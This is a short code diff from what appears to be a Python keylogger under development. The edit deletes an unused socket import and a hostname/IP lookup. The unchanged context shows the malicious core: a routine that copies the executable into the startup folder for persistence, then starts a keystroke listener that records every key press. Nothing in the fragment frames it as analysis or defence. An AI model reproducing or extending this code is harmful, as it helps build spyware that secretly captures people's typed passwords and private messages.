@@ -1,7 +1,6 @@
 import os
 import re
 import shutil
-import socket
 import subprocess
 import sys
 import threading
@@ -77,8 +76,6 @@ def copy_to_startup_folder():
 
 
 if __name__ == '__main__':
-    hostname = socket.gethostname()
-    host = socket.gethostbyname(hostname)
     if '.exe' in sys.argv[0]:
         if copy_to_startup_folder():
             with Listener(on_press=key_recorder) as listener:
